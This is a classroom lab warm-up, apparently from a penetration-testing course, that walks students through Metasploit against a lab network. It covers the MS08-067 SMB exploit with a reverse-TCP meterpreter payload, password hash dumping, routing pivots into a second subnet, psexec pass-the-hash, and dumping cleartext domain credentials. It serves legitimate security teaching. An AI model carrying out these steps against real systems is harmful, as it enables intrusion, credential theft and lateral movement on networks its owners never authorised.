## Warm Up

This activity will be a review of the topics and techniques that we learned in the last class such as scanning and exploiting vulnerabilities, maintaining access, and using pivot points to attack other machines on the network.  If you need additional help feel free to use the CybrScore hints, but ideally you should use your notes and reach out to your neighbor. Good luck! 

---

In the next steps, you will use Metasploit CLI and its counterpart, Meterpreter, to exploit the vulnerabilities you identified earlier in the lab. You will exploit each host in the initial subnet following a defined set of steps and use the information obtained from each exploit attempt to help pivot into a new subnet and exploit other hosts.

- Open a terminal prompt by clicking the Terminal icon in the side bar.

- Starts the built-in postgresql server, if it's not already running. 

- Initializes the Metasploit database. 

- Open the Metasploit console. 

- In the Meatsploit console run a fast service scan that shows you the opperating systems of the `10.10.10.0/24 subnet` and press ENTER. 
	- Take note of which IP address is running SMB. 

- At the metasploit prompt, use the exploit `/windows/smb/ms08_067_netapi` to being attacking the SMB machine. 

- Use the payload `windows/meterpreter/reverse_tcp` to set up a reverse TCP connection. 

- Set the `RHOST` to the IP running SMB. 

- Set the `LHOST` to your IP address.

- Set the `LPORT` to the port 4444. 
- Type `run -j` and press ENTER to run the exploit
  - Once the exploit has finished running, you should see a message that says "Meterpreter session 1 opened". At the prompt, type sessions and press ENTER to see your currently active command/meterpreter shell sessions, and you should see a meterpreter session, running as the SYSTEM user, on 10.10.10.20.
  
- Type `background` to background the session. 

- Use the post exploit `/windows/gather/hashdump` to gather the password hashes and press ENTER

- Configure your session number and press ENTER
  - `set SESSION x`

- Type `run -j` and press ENTER to run the module. The module will run, and dump the password hashes that it finds.

- At the msf prompt, type `creds` and press ENTER to see your recently dumped password hashes now stored in the Metasploit database, which we will use later in this activity. 

- Return to your meterpreter session

- Run ifconfig to grab the other subnet the victim machine is connected to.

- At the msf prompt, use the post exploit `/multi/manage/autoroute` to establish a network connection between your machine, and a pivoted network. 

- Type `set CMD add` and press ENTER to change the command to add only the routes you specify.

- Type `set SUBNET 172.16.0.0` and press ENTER.

- Configure your session number and press ENTER
  - Ensure that the NETMASK variable is set to 255.255.255.0

- Type `run` and press ENTER. You will receive output about the successful route being added. You can confirm that the route has been added, or view existing routes, by typing `route` and pressing ENTER at the msf prompt at any time.

- At the msf prompt, use the `auxiliary/scanner/portscan/tcp`. 

- Use show options to view the options available to you in this module.

- Set the ports `139`,`445`, and `3389`. 

- Set the rhosts to `172.16.0.0/24`. 

- Set the threads to 50 and run it. The scan could take up to 10 minutes to complete. 

---

Now that you have identified the live hosts, we can use another Metasploit module to scan for SMB version to identify the exact version of Windows that each host is running.

- Use the `auxiliary/scanner/smb/smb_version` module and set the following:

- Using the hosts that you found in step 30, set the remote host targets with the RHOSTS parameter. Specify as many hosts as were found during step 30, then run the module. 
  - **Hint:** We have used the set RHOSTS 172.16.0.XXX,YYY notation, where XXX and YYY are the last octet of the hosts that you find, up to the total number of hosts found. You can also separate your RHOSTS parameter by specifying each host's full IP address, with each host separated with a space, rather than a comma: set RHOSTS 172.16.0.XXX 172.16.0.YYY and so on.

- At the msf prompt, type `hosts` and `services` to confirm that the results of your new scan have populated the database for easy reference later.

- At the msf prompt, use the module `/windows/smb/psexec` to exploit the machine running Samba in the other network.  

- Set the Rhosts to `172.16.0.150`. 

- Type `creds` and copy the administrator password. 

- Set the `SMBPass` to the hash that you copied in the last step. 

- Set the `SMBUser` to `administrator`

- Set the payload to the `windows/x64/meterpreter/bind_tcp` and press ENTER

- Type `set LPORT 4444` and press ENTER

- Type `run` within a few seconds, you should get a message with "Meterpreter session 2 opened".
  - If you do not, **try running the exploit again**.

- With a SYSTEM meterpreter shell on the new machine in the network, you can now attempt to dump hashes and hopefully any domain credentials in memory. 

- Type `background`

- Use the post module `/windows/gather/hashdump` and press ENTER

- Set your new session number and press ENTER.

- Type `run -j` and press ENTER to dump the local hashes found.

- Next, use the post module `/windows/gather/credentials/sso` and press ENTER.

- Set your new session number and press ENTER.

- Type `run` and press ENTER to run the module, and dump the credentials, in plaintext for any domain users that have logged in.

- Run `creds` at the msf prompt once more to see your newly acquired cleartext domain credentials.
